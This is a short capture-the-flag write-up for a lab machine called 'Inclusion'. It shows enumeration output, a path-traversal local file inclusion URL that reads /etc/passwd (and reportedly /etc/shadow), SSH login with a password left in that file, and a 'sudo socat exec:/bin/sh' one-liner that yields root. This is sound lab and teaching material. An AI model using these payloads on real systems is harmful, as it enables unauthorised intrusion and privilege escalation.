# Inclusion - Linux - Easy
---

## Enumeration

### nmap: `nmap -sV 10.10.108.241 -oN nmap-scan`

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster: `gobuster dir -u http://10.10.108.241 -w ../wordlist_common.txt -o gobuster-scan`

```bash
/article              (Status: 500) [Size: 290]
```

### Manual enumeration

Going through website it seems all the articles stem from page *article* with parameter as *name*

Checking for */etc/passwd* reveals the data in the file: `http://10.10.108.241/article?name=../../../../../etc/passwd`

*Interesting find: /etc/shadow file is also readable by using the LFI not sure if it was intended that way cause I never used it for anything.*

## User.txt

Someone just left the password in plain text for user *falconfeast* in passwd file in comments. Use that to connect to ssh on the machine and just `cat` the *user.txt*.

## Root.txt

Executing `sudo -l` reveals the following:

```bash
User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

Executing `sudo /usr/bin/socat stdin exec:/bin/sh` *(got from [gftobins](https://gtfobins.github.io/gtfobins/socat/))* to get root user access on machine.

Just `cat` the flag file located at */root/root.txt* to get the root flag.
